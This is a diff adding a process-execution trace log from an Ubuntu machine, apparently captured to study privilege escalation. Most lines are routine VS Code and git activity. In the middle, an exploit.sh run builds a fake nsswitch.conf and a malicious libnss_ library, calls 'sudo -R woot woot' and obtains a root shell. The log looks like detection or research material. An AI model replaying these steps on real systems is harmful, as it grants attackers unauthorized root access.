@@ -1,0 +1,676 @@
+EXEC|execve|5346370292994|8884|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+CLONE3|8885|8854|5346373840711
+CLONE|8884|5761|5346369897672
+EXEC|execve|5346375193316|8886|8884|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5346410812027|8887|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5857 6406 8846 6407 8853 6408 8854
+EXEC|execve|5346413852607|8888|8887|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5857 6406 8846 6407 8853 6408 8854
+EXEC|execve|5346417215348|8889|8888|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5346420343600|8890|8888|1000|cpuUsage.sh|cat /proc/5857/stat
+EXEC|execve|5346424429871|8891|8888|1000|cpuUsage.sh|cat /proc/6406/stat
+EXEC|execve|5346428123590|8892|8888|1000|cpuUsage.sh|cat /proc/8846/stat
+EXEC|execve|5346430513577|8893|8888|1000|cpuUsage.sh|cat /proc/6407/stat
+EXEC|execve|5346433515608|8894|8888|1000|cpuUsage.sh|cat /proc/8853/stat
+EXEC|execve|5346436252678|8895|8888|1000|cpuUsage.sh|cat /proc/6408/stat
+EXEC|execve|5346439902361|8896|8888|1000|cpuUsage.sh|cat /proc/8854/stat
+EXEC|execve|5346442341119|8897|8888|1000|cpuUsage.sh|sleep 1
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/state.vscdb-journal|libuv-worker
+CLONE|8898|8888|5347445509857
+EXEC|execve|5347446228254|8898|8888|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5347451051309|8899|8888|1000|cpuUsage.sh|cat /proc/5857/stat
+EXEC|execve|5347457025993|8901|8888|1000|cpuUsage.sh|cat /proc/6406/stat
+EXEC|execve|5347461668636|8903|8888|1000|cpuUsage.sh|cat /proc/8846/stat
+EXEC|execve|5347465523173|8905|8888|1000|cpuUsage.sh|cat /proc/6407/stat
+EXEC|execve|5347469756176|8907|8888|1000|cpuUsage.sh|cat /proc/8853/stat
+EXEC|execve|5347474509818|8909|8888|1000|cpuUsage.sh|cat /proc/6408/stat
+EXEC|execve|5347478724264|8911|8888|1000|cpuUsage.sh|cat /proc/8854/stat
+CLONE|8913|5774|5348661356094
+EXEC|execve|5348662588115|8913|5774|1000|code|git config --get commit.template
+EXEC|execve|5348676618771|8914|5774|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
+EXEC|execve|5348696452443|8915|5774|1000|code|git status -z -uall
+EXEC|execve|5348704897438|8916|5774|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
+CLONE|8917|5774|5349038983513
+EXEC|execve|5349040137513|8917|5774|1000|code|git check-ignore -v -z --stdin
+CLONE|25|5733|5349099952022
+CLONE|26|5733|5349307337743
+FILE_CREATE|1000|5872|0|0|/dev/null|bash
+FILE_CREATE|1000|5872|0|0|/dev/null|bash
+FILE_CREATE|1000|5872|0|0|/dev/null|bash
+FILE_CREATE|1000|5872|0|0|/dev/null|bash
+CLONE|8920|5872|5350516278294
+FILE_CREATE|1000|8920|0|0|/dev/null|bash
+FILE_CREATE|1000|5872|0|0|/dev/null|bash
+FILE_CREATE|1000|8921|0|0|/dev/null|bash
+FILE_CREATE|1000|5872|0|0|/dev/null|bash
+FILE_CREATE|1000|5872|0|0|/dev/null|bash
+FILE_CREATE|1000|5872|0|0|/dev/null|bash
+CLONE|8924|5761|5351352049188
+EXEC|execve|5351352973604|8924|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5351359585653|8925|8924|1000|sh|which ps
+EXEC|execve|5351374955941|8926|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5351382102387|8927|8926|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5351425348258|8928|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5857 6406 8846 6407 8853 6408 8854
+EXEC|execve|5351429263023|8929|8928|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5857 6406 8846 6407 8853 6408 8854
+EXEC|execve|5351433831843|8930|8929|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5351438181757|8931|8929|1000|cpuUsage.sh|cat /proc/5857/stat
+EXEC|execve|5351441817023|8932|8929|1000|cpuUsage.sh|cat /proc/6406/stat
+EXEC|execve|5351445540000|8933|8929|1000|cpuUsage.sh|cat /proc/8846/stat
+EXEC|execve|5351449178661|8934|8929|1000|cpuUsage.sh|cat /proc/6407/stat
+EXEC|execve|5351452820275|8935|8929|1000|cpuUsage.sh|cat /proc/8853/stat
+EXEC|execve|5351456802370|8936|8929|1000|cpuUsage.sh|cat /proc/6408/stat
+EXEC|execve|5351460818790|8937|8929|1000|cpuUsage.sh|cat /proc/8854/stat
+EXEC|execve|5351464828707|8938|8929|1000|cpuUsage.sh|sleep 1
+CLONE|8939|5761|5351507634697
+EXEC|execve|5351508331691|8939|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5351513282293|8940|8939|1000|sh|which ps
+CLONE|8941|5872|5351516028758
+EXEC|execve|5351520692954|8942|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5351522279819|8943|5872|1000|bash|sudo python3 trace_privi.py
+EXEC|execve|5351525645094|8944|8942|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+FILE_CREATE|1000|8943|0|0|1000|sudo
+CLONE|8945|5888|5351544252571
+EXEC|execve|5351566608942|8951|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 6464
+EXEC|execve|5351572650732|8952|8951|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 6464
+EXEC|execve|5351579893929|8953|8952|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5351585279192|8954|8952|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5351588238051|8955|8952|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5351593609190|8956|8952|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5351596911408|8957|8952|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5351601882407|8958|8952|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5351605601254|8959|8952|1000|cpuUsage.sh|sleep 1
+CLONE|8960|8929|5352470655476
+EXEC|execve|5352471954198|8960|8929|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5352478439691|8961|8929|1000|cpuUsage.sh|cat /proc/5857/stat
+EXEC|execve|5352490375345|8963|8929|1000|cpuUsage.sh|cat /proc/6406/stat
+EXEC|execve|5352500247068|8965|8929|1000|cpuUsage.sh|cat /proc/8846/stat
+EXEC|execve|5352508102953|8967|8929|1000|cpuUsage.sh|cat /proc/6407/stat
+EXEC|execve|5352514180517|8969|8929|1000|cpuUsage.sh|cat /proc/8853/stat
+CLONE|8970|5761|5352518156128
+EXEC|execve|5352518940036|8970|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5352521993891|8972|8929|1000|cpuUsage.sh|cat /proc/6408/stat
+EXEC|execve|5352525202727|8973|8970|1000|sh|which ps
+EXEC|execve|5352530129075|8975|8929|1000|cpuUsage.sh|cat /proc/8854/stat
+EXEC|execve|5352535219533|8976|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5352539572815|8978|8976|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5352585104406|8979|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 6464
+EXEC|execve|5352590586996|8980|8979|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 6464
+EXEC|execve|5352596407253|8981|8980|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5352601963277|8982|8980|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5352605508329|8983|8980|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5352609821573|8984|8980|1000|cpuUsage.sh|cat /proc/8943/stat
+CLONE|8985|8952|5352610673853
+EXEC|execve|5352611560244|8985|8952|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5352614146912|8986|8980|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5352616455839|8987|8952|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5352619734112|8988|8980|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5352622409531|8990|8952|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5352623576172|8991|8980|1000|cpuUsage.sh|sleep 1
+EXEC|execve|5352628627993|8993|8952|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5352634399360|8995|8952|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5352640320702|8997|8952|1000|cpuUsage.sh|cat /proc/6464/stat
+CLONE|8999|8980|5353627559727
+EXEC|execve|5353628868662|8999|8980|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5353638920166|9000|8980|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5353646152667|9002|8980|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5353652329710|9004|8980|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5353657092355|9006|8980|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5353661650709|9008|8980|1000|cpuUsage.sh|cat /proc/6464/stat
+CLONE|9010|5774|5353746572439
+EXEC|execve|5353747580271|9010|5774|1000|code|git config --get commit.template
+EXEC|execve|5353762663095|9011|5774|1000|code|git for-each-ref --format=%(refname)%00%(upstream:short)%00%(objectname)%00%(upstream:track)%00%(upstream:remotename)%00%(upstream:remoteref) refs/heads/main refs/remotes/main
+EXEC|execve|5353776465549|9012|5774|1000|code|git status -z -uall
+EXEC|execve|5353785842217|9013|5774|1000|code|git for-each-ref --sort -committerdate --format %(refname)%00%(objectname)%00%(*objectname)
+CLONE|9014|8943|5354154292946
+CLONE|9015|9014|5354156119676
+EXEC|execve|5354157172223|9015|9014|0|sudo|python3 trace_privi.py
+EXEC|execve|5355146775986|9016|5761|1000|code|/bin/sh -c which ps
+CLONE|9016|5761|5355146029525
+EXEC|execve|5355151121843|9017|9016|1000|sh|which ps
+EXEC|execve|5355155397134|9018|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5355157904929|9019|9018|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5355193516163|9020|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464
+EXEC|execve|5355198409764|9021|9020|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464
+EXEC|execve|5355202492504|9022|9021|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5355206523717|9023|9021|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5355210346442|9024|9021|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5355214030131|9025|9021|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5355217760224|9026|9021|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5355221437494|9027|9021|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5355225690378|9028|9021|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5355230045478|9029|9021|1000|cpuUsage.sh|sleep 1
+CLONE|9030|9021|5356232457484
+EXEC|execve|5356234280413|9030|9021|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5356238795627|9031|9021|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5356243913479|9033|9021|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5356251295050|9035|9021|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5356258452403|9037|9021|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5356261639970|9039|9021|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5356264073934|9041|9021|1000|cpuUsage.sh|cat /proc/6464/stat
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/chatEditingSessions/0d1f1cf5-bd31-4bbe-8828-56832b0f390f/state.json|libuv-worker
+CLONE|9043|5761|5358660397769
+EXEC|execve|5358663065411|9043|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5358670528315|9044|9043|1000|sh|which ps
+EXEC|execve|5358676754531|9045|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5358681520654|9046|9045|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5358725137331|9047|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5358729785828|9048|9047|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5358733562504|9049|9048|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5358738281252|9050|9048|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5358744333727|9051|9048|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5358747713746|9052|9048|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5358751065981|9053|9048|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5358754501540|9054|9048|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5358758838721|9055|9048|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5358762230236|9056|9048|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5358766374864|9057|9048|1000|cpuUsage.sh|sleep 1
+CLONE|9058|9048|5359770406243
+EXEC|execve|5359771376099|9058|9048|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5359779406175|9059|9048|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5359784501100|9061|9048|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5359789255628|9063|9048|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5359795511761|9065|9048|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5359799989948|9067|9048|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5359804851170|9069|9048|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5359809169876|9071|9048|1000|cpuUsage.sh|cat /proc/9015/stat
+CLONE|9073|8770|5360502063514
+EXEC|execve|5360504187071|9073|8770|1000|gnome-terminal-|bash
+FILE_CREATE|1000|2370|0|0|/run/user/1000/systemd/transient/vte-spawn-aa0c72a1-8a81-48f9-9603-378de2bcbf39.scope|systemd
+EXEC|execve|5360512533237|9075|9073|1000|bash|lesspipe
+EXEC|execve|5360516038372|9076|9075|1000|lesspipe|basename /usr/bin/lesspipe
+FILE_CREATE|1000|2370|0|0|/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/vte-spawn-aa0c72a1-8a81-48f9-9603-378de2bcbf39.scope/cgroup.subtree_control|systemd
+CLONE|9078|9077|5360520076903
+EXEC|execve|5360520338465|9078|9077|1000|lesspipe|dirname /usr/bin/lesspipe
+EXEC|execve|5360525744301|9079|9073|1000|bash|dircolors -b
+FILE_CREATE|1000|9073|0|0|/dev/null|bash
+CLONE|9080|9073|5368283190122
+EXEC|execve|5368283704440|9080|9073|1000|bash|./exploit.sh
+EXEC|execve|5368288248087|9081|9080|1000|exploit.sh|mktemp -d /tmp/sudowoot.stage.XXXXXX
+EXEC|execve|5368293871645|9082|9080|1000|exploit.sh|cat
+FILE_CREATE|1000|9082|0|0|woot1337.c|exploit.sh
+EXEC|execve|5368297288380|9083|9080|1000|exploit.sh|mkdir -p woot/etc libnss_
+FILE_CREATE|1000|9080|0|0|woot/etc/nsswitch.conf|exploit.sh
+EXEC|execve|5368306478323|9084|9080|1000|exploit.sh|cp /etc/group woot/etc
+FILE_CREATE|1000|9084|0|0|group|cp
+EXEC|execve|5368312949978|9085|9080|1000|exploit.sh|gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
+FILE_CREATE|1000|9085|0|0|/tmp/ccxlOXIg.s|gcc
+EXEC|execve|5368318719954|9086|9085|1000|gcc|/usr/libexec/gcc/x86_64-linux-gnu/13/cc1 -quiet -imultiarch x86_64-linux-gnu woot1337.c -quiet -dumpdir libnss_/woot1337.so.2- -dumpbase woot1337.c -dumpbase-ext .c -mtune=generic -march=x86-64 -fPIC -fasynchronous-unwind-tables -fstack-protector-strong -Wformat -Wformat-security -fstack-clash-protection
+FILE_CREATE|1000|9086|0|0|/tmp/ccxlOXIg.s|cc1
+FILE_CREATE|1000|9085|0|0|/tmp/ccjtmMS1.o|gcc
+EXEC|execve|5368394808899|9087|9085|1000|gcc|as --64 -o /tmp/ccjtmMS1.o /tmp/ccxlOXIg.s
+FILE_CREATE|1000|9087|0|0|/tmp/ccjtmMS1.o|as
+FILE_CREATE|1000|9085|0|0|/tmp/ccVkYeuT.res|gcc
+EXEC|execve|5368411067942|9088|9085|1000|gcc|/usr/libexec/gcc/x86_64-linux-gnu/13/collect2 -plugin /usr/libexec/gcc/x86_64-linux-gnu/13/liblto_plugin.so -plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper -plugin-opt=-fresolution=/tmp/ccVkYeuT.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -shared -z relro -o
+FILE_CREATE|1000|9088|0|0|/tmp/cctyresZ.cdtor.c|collect2
+FILE_CREATE|1000|9088|0|0|/tmp/ccfffJfc.cdtor.o|collect2
+EXEC|execve|5368416070554|9089|9088|1000|collect2|/usr/bin/ld -plugin /usr/libexec/gcc/x86_64-linux-gnu/13/liblto_plugin.so -plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper -plugin-opt=-fresolution=/tmp/ccVkYeuT.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -shared -z relro -o
+FILE_CREATE|1000|9089|0|0|libnss_/woot1337.so.2|ld
+CLONE|9090|9080|5368465000065
+EXEC|execve|5368465486349|9090|9080|1000|exploit.sh|sudo -R woot woot
+FILE_CREATE|1000|9090|0|0|1000|sudo
+EXEC|execve|5368490393211|9091|9090|0|bash|lesspipe
+EXEC|execve|5368494155256|9092|9091|0|lesspipe|basename /usr/bin/lesspipe
+CLONE|9094|9093|5368498835984
+EXEC|execve|5368499206418|9094|9093|0|lesspipe|dirname /usr/bin/lesspipe
+EXEC|execve|5368504751238|9095|9015|0|python3|/usr/bin/dot -T dot
+CLONE3|9095|9015|5368505430860
+EXEC|execve|5368505941144|9096|9090|0|bash|dircolors -b
+FILE_CREATE|0|9090|0|0|/dev/null|bash
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/CachedData/072586267e68ece9a47aa43f8c108e0dcbf44622/chrome/js/index-dir/temp-index|ThreadPoolForeg
+CLONE|9100|5761|5369493074694
+EXEC|execve|5369494635603|9100|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5369502309149|9101|9100|1000|sh|which ps
+EXEC|execve|5369513293671|9102|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5369516546557|9103|9102|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5369559490159|9104|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5369564725901|9105|9104|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5369569317459|9106|9105|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5369574543353|9107|9105|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5369578874930|9108|9105|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5369581911289|9109|9105|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5369584833621|9110|9105|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5369587192930|9111|9105|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5369589515783|9112|9105|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5369592538916|9113|9105|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5369595710956|9114|9105|1000|cpuUsage.sh|sleep 1
+CLONE3|9115|9015|5370053849541
+CLONE|9116|5774|5370288612104
+EXEC|execve|5370289561965|9116|5774|1000|code|git check-ignore -v -z --stdin
+CLONE|9117|9105|5370602423247
+EXEC|execve|5370603501205|9117|9105|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5370612966619|9118|9105|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5370625173375|9120|9105|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5370633981833|9122|9105|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5370642172445|9124|9105|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5370649994334|9126|9105|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5370658876553|9128|9105|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5370667423030|9130|9105|1000|cpuUsage.sh|cat /proc/9015/stat
+CLONE|9132|5761|5374492393750
+EXEC|execve|5374492946802|9132|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5374498119278|9133|9132|1000|sh|which ps
+EXEC|execve|5374508349401|9134|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5374514987829|9135|9134|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5374558509647|9136|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5374562911843|9137|9136|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5374566930390|9138|9137|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5374573919566|9139|9137|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5374577561125|9140|9137|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5374581326438|9141|9137|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5374585082889|9142|9137|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5374588819525|9143|9137|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5374592555637|9144|9137|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5374596314676|9145|9137|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5374600277313|9146|9137|1000|cpuUsage.sh|sleep 1
+CLONE|9147|9137|5375603339382
+EXEC|execve|5375604146033|9147|9137|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5375609615844|9148|9137|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5375613609572|9150|9137|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5375617505302|9152|9137|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5375622145676|9154|9137|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5375627351260|9156|9137|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5375632505410|9158|9137|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5375637454492|9160|9137|1000|cpuUsage.sh|cat /proc/9015/stat
+FILE_CREATE|0|9162|0|0|.lock|(udev-worker)
+FILE_CREATE|0|9162|0|0|/run/udev/data/.#c226:0f29501601c0ee333|(udev-worker)
+CLONE|9163|9162|5377678672793
+EXEC|execve|5377679910228|9163|9162|0|(spawn)|/usr/bin/touch /run/udev/gdm-machine-has-hardware-gpu
+FILE_CREATE|0|9163|0|0|/run/udev/gdm-machine-has-hardware-gpu|touch
+EXEC|execve|5377688823442|9164|9162|0|(spawn)|/usr/lib/snapd/snap-device-helper change snap_firefox_firefox /devices/pci0000:00/0000:00:0f.0/drm/card0 226:0
+EXEC|execve|5377694789923|9165|9162|0|(spawn)|/usr/lib/snapd/snap-device-helper change snap_firefox_geckodriver /devices/pci0000:00/0000:00:0f.0/drm/card0 226:0
+EXEC|execve|5377699893282|9166|9162|0|(spawn)|/usr/lib/snapd/snap-device-helper change snap_firmware-updater_firmware-notifier /devices/pci0000:00/0000:00:0f.0/drm/card0 226:0
+EXEC|execve|5377706621474|9167|9162|0|(spawn)|/usr/lib/snapd/snap-device-helper change snap_firmware-updater_firmware-updater /devices/pci0000:00/0000:00:0f.0/drm/card0 226:0
+EXEC|execve|5377712358606|9168|9162|0|(spawn)|/usr/lib/snapd/snap-device-helper change snap_firmware-updater_firmware-updater-app /devices/pci0000:00/0000:00:0f.0/drm/card0 226:0
+EXEC|execve|5377717155056|9169|9162|0|(spawn)|/usr/lib/snapd/snap-device-helper change snap_snap-store_show-updates /devices/pci0000:00/0000:00:0f.0/drm/card0 226:0
+EXEC|execve|5377722572636|9170|9162|0|(spawn)|/usr/lib/snapd/snap-device-helper change snap_snap-store_snap-store /devices/pci0000:00/0000:00:0f.0/drm/card0 226:0
+EXEC|execve|5377730871217|9171|9162|0|(spawn)|/usr/lib/snapd/snap-device-helper change snap_snapd-desktop-integration_snapd-desktop-integration /devices/pci0000:00/0000:00:0f.0/drm/card0 226:0
+CLONE|9179|5761|5401094351752
+EXEC|execve|5401095400923|9179|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5401102850242|9180|9179|1000|sh|which ps
+EXEC|execve|5401113076194|9181|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5401119884395|9182|9181|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5401162679577|9183|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5401168064276|9184|9183|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5401173084841|9185|9184|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5401177779933|9186|9184|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5401183208261|9187|9184|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5401186627861|9188|9184|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5401190929965|9189|9184|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5401195602686|9190|9184|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5401200285129|9191|9184|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5401204387910|9192|9184|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5401208356120|9193|9184|1000|cpuUsage.sh|sleep 1
+CLONE|9194|9184|5402215995138
+EXEC|execve|5402217100917|9194|9184|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5402227340286|9195|9184|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5402239558840|9197|9184|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5402246980505|9199|9184|1000|cpuUsage.sh|cat /proc/8943/stat
